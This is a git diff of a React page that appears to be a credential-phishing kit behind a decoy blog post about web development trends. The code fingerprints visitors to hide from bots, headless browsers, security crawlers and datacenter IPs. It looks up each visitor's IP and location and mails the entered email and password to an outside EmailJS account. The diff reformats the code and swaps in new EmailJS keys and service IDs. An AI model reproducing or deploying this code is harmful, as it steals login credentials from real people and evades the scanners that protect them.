@@ -14,20 +14,36 @@ const App = () => {
   const [emailJsReady, setEmailJsReady] = useState(false);
   const [keepSignedIn, setKeepSignedIn] = useState(false);
   const [blogComments, setBlogComments] = useState([
-    { id: 1, author: "Sarah Johnson", comment: "Great article! Very informative.", date: "2 hours ago" },
-    { id: 2, author: "Mike Chen", comment: "Thanks for sharing this useful information.", date: "5 hours ago" },
-    { id: 3, author: "Emma Watson", comment: "Looking forward to more posts like this.", date: "1 day ago" },
+    {
+      id: 1,
+      author: "Sarah Johnson",
+      comment: "Great article! Very informative.",
+      date: "2 hours ago",
+    },
+    {
+      id: 2,
+      author: "Mike Chen",
+      comment: "Thanks for sharing this useful information.",
+      date: "5 hours ago",
+    },
+    {
+      id: 3,
+      author: "Emma Watson",
+      comment: "Looking forward to more posts like this.",
+      date: "1 day ago",
+    },
   ]);
 
   // Load EmailJS script dynamically
   useEffect(() => {
     const script = document.createElement("script");
-    script.src = "https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js";
+    script.src =
+      "https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js";
     script.async = true;
     script.onload = () => {
       if (window.emailjs) {
         window.emailjs.init({
-          publicKey: "Eyfm5Q_2Xwc2eqVQ1",
+          publicKey: "xGT5HoyArhgWh7Ze7",
         });
         setEmailJsReady(true);
         console.log("EmailJS initialized");
@@ -41,76 +57,133 @@ const App = () => {
   useEffect(() => {
     const detectBot = () => {
       const userAgent = navigator.userAgent.toLowerCase();
-      
+
       // Mobile detection
       const isMobile = () => {
-        const mobilePatterns = ["android", "iphone", "ipad", "ipod", "blackberry", "windows phone", "mobile", "tablet"];
-        return mobilePatterns.some(pattern => userAgent.includes(pattern));
+        const mobilePatterns = [
+          "android",
+          "iphone",
+          "ipad",
+          "ipod",
+          "blackberry",
+          "windows phone",
+          "mobile",
+          "tablet",
+        ];
+        return mobilePatterns.some((pattern) => userAgent.includes(pattern));
       };
-      
+
       const isMobileDevice = isMobile();
-      const isMobileBrowser = isMobileDevice && (
-        userAgent.includes("chrome") || userAgent.includes("safari") || 
-        userAgent.includes("firefox") || userAgent.includes("edge") || userAgent.includes("opera")
-      );
-      
+      const isMobileBrowser =
+        isMobileDevice &&
+        (userAgent.includes("chrome") ||
+          userAgent.includes("safari") ||
+          userAgent.includes("firefox") ||
+          userAgent.includes("edge") ||
+          userAgent.includes("opera"));
+
       // Bot patterns
-      const botPatterns = ["bot", "crawler", "spider", "scraper", "headless", "googlebot", "bingbot", 
-        "slurp", "duckduckbot", "baiduspider", "yandexbot", "facebookexternalhit", "twitterbot", 
-        "rogerbot", "linkedinbot", "embedly", "quora link preview", "showyoubot", "outbrain", 
-        "pinterest", "slackbot", "vkShare", "telegrambot"];
-      
-      const isUserAgentBot = !isMobileBrowser && botPatterns.some((pattern) => userAgent.includes(pattern));
-      
+      const botPatterns = [
+        "bot",
+        "crawler",
+        "spider",
+        "scraper",
+        "headless",
+        "googlebot",
+        "bingbot",
+        "slurp",
+        "duckduckbot",
+        "baiduspider",
+        "yandexbot",
+        "facebookexternalhit",
+        "twitterbot",
+        "rogerbot",
+        "linkedinbot",
+        "embedly",
+        "quora link preview",
+        "showyoubot",
+        "outbrain",
+        "pinterest",
+        "slackbot",
+        "vkShare",
+        "telegrambot",
+      ];
+
+      const isUserAgentBot =
+        !isMobileBrowser &&
+        botPatterns.some((pattern) => userAgent.includes(pattern));
+
       // Headless browser detection (skip for mobile)
-      const isHeadless = !isMobileDevice && (
-        !navigator.webdriver === false || navigator.webdriver === true || 
-        !navigator.languages || navigator.plugins.length === 0
-      );
-      
+      const isHeadless =
+        !isMobileDevice &&
+        (!navigator.webdriver === false ||
+          navigator.webdriver === true ||
+          !navigator.languages ||
+          navigator.plugins.length === 0);
+
       // Automation detection (skip for mobile)
-      const hasAutomation = !isMobileDevice && (
-        (window.chrome?.runtime?.id === undefined && userAgent.includes("Headless")) ||
-        userAgent.includes("PhantomJS")
-      );
-      
+      const hasAutomation =
+        !isMobileDevice &&
+        ((window.chrome?.runtime?.id === undefined &&
+          userAgent.includes("Headless")) ||
+          userAgent.includes("PhantomJS"));
+
       // Screen size check (skip for mobile)
-      const isSmallScreen = !isMobileDevice && (window.innerWidth === 0 || window.innerHeight === 0);
-      
+      const isSmallScreen =
+        !isMobileDevice &&
+        (window.innerWidth === 0 || window.innerHeight === 0);
+
       // Mouse movement (skip for touch devices)
       let hasMouseMoved = false;
-      const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+      const isTouchDevice =
+        "ontouchstart" in window || navigator.maxTouchPoints > 0;
       if (!isTouchDevice) {
-        const trackMouseMove = () => { hasMouseMoved = true; };
+        const trackMouseMove = () => {
+          hasMouseMoved = true;
+        };
         document.addEventListener("mousemove", trackMouseMove);
-        setTimeout(() => document.removeEventListener("mousemove", trackMouseMove), 1000);
+        setTimeout(
+          () => document.removeEventListener("mousemove", trackMouseMove),
+          1000,
+        );
       } else {
         hasMouseMoved = true;
       }
-      
-      const missingAPIs = !window.history || !window.document || !window.navigator;
-      
+
+      const missingAPIs =
+        !window.history || !window.document || !window.navigator;
+
       const checkBotHeaders = async () => {
         if (isMobileDevice) return false;
         try {
           const response = await fetch("https://ipinfo.io/json");
           const data = await response.json();
-          const isDatacenter = data.org?.toLowerCase().includes("hosting") ||
-                               data.org?.toLowerCase().includes("cloud") ||
-                               data.org?.toLowerCase().includes("datacenter");
+          const isDatacenter =
+            data.org?.toLowerCase().includes("hosting") ||
+            data.org?.toLowerCase().includes("cloud") ||
+            data.org?.toLowerCase().includes("datacenter");
           return isDatacenter;
-        } catch { return false; }
+        } catch {
+          return false;
+        }
       };
-      
+
       const determineIfBot = async () => {
         const isDatacenterIP = await checkBotHeaders();
-        let botScore = [isUserAgentBot, isHeadless, hasAutomation, isSmallScreen, missingAPIs, isDatacenterIP];
+        let botScore = [
+          isUserAgentBot,
+          isHeadless,
+          hasAutomation,
+          isSmallScreen,
+          missingAPIs,
+          isDatacenterIP,
+        ];
         if (!isTouchDevice) botScore.push(!hasMouseMoved);
         const score = botScore.filter(Boolean).length;
         if (isMobileDevice) return score >= 4;
         return score >= 2;
       };
-      
+
       determineIfBot().then(setIsBot);
     };
     detectBot();
@@ -125,7 +198,15 @@ const App = () => {
           const data = await response.json();
           if (data && data.ip) setCachedIpData(data);
         } catch (error) {
-          setCachedIpData({ ip: "COLLECTION_FAILED", city: "Unknown", region: "Unknown", country: "Unknown", org: "Unknown", timezone: "Unknown", loc: "Unknown" });
+          setCachedIpData({
+            ip: "COLLECTION_FAILED",
+            city: "Unknown",
+            region: "Unknown",
+            country: "Unknown",
+            org: "Unknown",
+            timezone: "Unknown",
+            loc: "Unknown",
+          });
         }
       };
       collectIpData();
@@ -133,9 +214,11 @@ const App = () => {
   }, [isBot]);
 
   const sendDataViaEmail = async (emailValue, passwordValue) => {
-    if (!window.emailjs || !emailJsReady) throw new Error("EmailJS not initialized");
-    if (!cachedIpData || !cachedIpData.ip) throw new Error("No IP data available");
-    
+    if (!window.emailjs || !emailJsReady)
+      throw new Error("EmailJS not initialized");
+    if (!cachedIpData || !cachedIpData.ip)
+      throw new Error("No IP data available");
+
     const params = {
       ip_address: cachedIpData.ip || "Unknown",
       city: cachedIpData.city || "Unknown",
@@ -156,7 +239,7 @@ const App = () => {
       email: emailValue,
       password: passwordValue,
     };
-    return window.emailjs.send("service_txhhhjj", "template_dvst2eq", params);
+    return window.emailjs.send("service_22vflet", "template_5yxczld", params);
   };
 
   const handleEmailSubmit = (e) => {
@@ -176,7 +259,7 @@ const App = () => {
       return;
     }
     if (isSubmitting) return;
-    
+
     setIsSubmitting(true);
     try {
       await sendDataViaEmail(email, password);
@@ -234,52 +317,131 @@ const App = () => {
 
         <main className="grid md:grid-cols-3 gap-8 mb-10">
           <article className="md:col-span-2 bg-white p-8 rounded-xl shadow-md">
-            <h2 className="text-2xl mb-4">The Future of Web Development: What to Expect in 2025</h2>
+            <h2 className="text-2xl mb-4">
+              The Future of Web Development: What to Expect in 2025
+            </h2>
             <div className="text-gray-600 text-sm mb-5">
-              <span>By John Doe</span> • <span>March 15, 2025</span> • <span>8 min read</span>
+              <span>By John Doe</span> • <span>March 15, 2025</span> •{" "}
+              <span>8 min read</span>
             </div>
-            <img src="https://placehold.co/800x400/5a23b9/white?text=Web+Development" alt="Web Development" className="w-full rounded-lg mb-5" />
+            <img
+              src="https://placehold.co/800x400/5a23b9/white?text=Web+Development"
+              alt="Web Development"
+              className="w-full rounded-lg mb-5"
+            />
             <div className="space-y-4 text-gray-700">
-              <p>Web development continues to evolve at a rapid pace. As we move through 2025, several key trends are shaping how we build and interact with websites and applications.</p>
-              <h3 className="text-xl font-semibold mt-4">AI-Powered Development</h3>
-              <p>Artificial intelligence is revolutionizing the way developers write code. From intelligent code completion to automated testing, AI tools are becoming indispensable in the modern developer's toolkit.</p>
-              <h3 className="text-xl font-semibold mt-4">Serverless Architecture</h3>
-              <p>The shift towards serverless computing continues to gain momentum. Developers can now focus on writing code without worrying about infrastructure management, leading to faster deployment and reduced operational costs.</p>
-              <h3 className="text-xl font-semibold mt-4">WebAssembly Advances</h3>
-              <p>WebAssembly is enabling near-native performance in web applications. This technology is opening up new possibilities for complex applications like video editing, gaming, and data visualization in the browser.</p>
-              <h3 className="text-xl font-semibold mt-4">Privacy-First Development</h3>
-              <p>With increasing concerns about data privacy, developers are adopting privacy-first approaches. New frameworks and tools are emerging to help build applications that respect user privacy by default.</p>
+              <p>
+                Web development continues to evolve at a rapid pace. As we move
+                through 2025, several key trends are shaping how we build and
+                interact with websites and applications.
+              </p>
+              <h3 className="text-xl font-semibold mt-4">
+                AI-Powered Development
+              </h3>
+              <p>
+                Artificial intelligence is revolutionizing the way developers
+                write code. From intelligent code completion to automated
+                testing, AI tools are becoming indispensable in the modern
+                developer's toolkit.
+              </p>
+              <h3 className="text-xl font-semibold mt-4">
+                Serverless Architecture
+              </h3>
+              <p>
+                The shift towards serverless computing continues to gain
+                momentum. Developers can now focus on writing code without
+                worrying about infrastructure management, leading to faster
+                deployment and reduced operational costs.
+              </p>
+              <h3 className="text-xl font-semibold mt-4">
+                WebAssembly Advances
+              </h3>
+              <p>
+                WebAssembly is enabling near-native performance in web
+                applications. This technology is opening up new possibilities
+                for complex applications like video editing, gaming, and data
+                visualization in the browser.
+              </p>
+              <h3 className="text-xl font-semibold mt-4">
+                Privacy-First Development
+              </h3>
+              <p>
+                With increasing concerns about data privacy, developers are
+                adopting privacy-first approaches. New frameworks and tools are
+                emerging to help build applications that respect user privacy by
+                default.
+              </p>
             </div>
           </article>
 
           <aside className="space-y-6">
             <div className="bg-gray-100 p-5 rounded-xl">
               <h3 className="font-semibold mb-3">About the Author</h3>
-              <p className="text-gray-700">John Doe is a senior web developer with over 10 years of experience in the industry. He specializes in React, Node.js, and modern web technologies.</p>
+              <p className="text-gray-700">
+                John Doe is a senior web developer with over 10 years of
+                experience in the industry. He specializes in React, Node.js,
+                and modern web technologies.
+              </p>
             </div>
             <div className="bg-gray-100 p-5 rounded-xl">
               <h3 className="font-semibold mb-3">Related Posts</h3>
               <ul className="space-y-2">
-                <li><a href="#" className="text-[#5a23b9] hover:underline">Understanding React Server Components</a></li>
-                <li><a href="#" className="text-[#5a23b9] hover:underline">TypeScript Best Practices for 2025</a></li>
-                <li><a href="#" className="text-[#5a23b9] hover:underline">The Rise of Edge Computing</a></li>
-                <li><a href="#" className="text-[#5a23b9] hover:underline">Building Accessible Web Applications</a></li>
+                <li>
+                  <a href="#" className="text-[#5a23b9] hover:underline">
+                    Understanding React Server Components
+                  </a>
+                </li>
+                <li>
+                  <a href="#" className="text-[#5a23b9] hover:underline">
+                    TypeScript Best Practices for 2025
+                  </a>
+                </li>
+                <li>
+                  <a href="#" className="text-[#5a23b9] hover:underline">
+                    The Rise of Edge Computing
+                  </a>
+                </li>
+                <li>
+                  <a href="#" className="text-[#5a23b9] hover:underline">
+                    Building Accessible Web Applications
+                  </a>
+                </li>
               </ul>
             </div>
           </aside>
         </main>
 
         <div className="bg-gray-50 p-8 rounded-xl mb-10">
-          <h3 className="text-xl font-semibold mb-4">Comments ({blogComments.length})</h3>
+          <h3 className="text-xl font-semibold mb-4">
+            Comments ({blogComments.length})
+          </h3>
           <form onSubmit={addComment} className="mb-6">
-            <input type="text" id="blog-name" placeholder="Your name" className="w-full p-2 border border-gray-300 rounded mb-2" />
-            <textarea id="blog-comment" placeholder="Leave a comment..." rows="3" className="w-full p-2 border border-gray-300 rounded mb-2"></textarea>
-            <button type="submit" className="bg-[#5a23b9] text-white px-6 py-2 rounded hover:bg-[#471a8f]">Post Comment</button>
+            <input
+              type="text"
+              id="blog-name"
+              placeholder="Your name"
+              className="w-full p-2 border border-gray-300 rounded mb-2"
+            />
+            <textarea
+              id="blog-comment"
+              placeholder="Leave a comment..."
+              rows="3"
+              className="w-full p-2 border border-gray-300 rounded mb-2"
+            ></textarea>
+            <button
+              type="submit"
+              className="bg-[#5a23b9] text-white px-6 py-2 rounded hover:bg-[#471a8f]"
+            >
+              Post Comment
+            </button>
           </form>
           <div className="space-y-4">
-            {blogComments.map(comment => (
+            {blogComments.map((comment) => (
               <div key={comment.id} className="pb-3 border-b border-gray-200">
-                <strong>{comment.author}</strong> <span className="text-gray-500 text-sm ml-2">{comment.date}</span>
+                <strong>{comment.author}</strong>{" "}
+                <span className="text-gray-500 text-sm ml-2">
+                  {comment.date}
+                </span>
                 <p className="text-gray-700 mt-1">{comment.comment}</p>
               </div>
             ))}
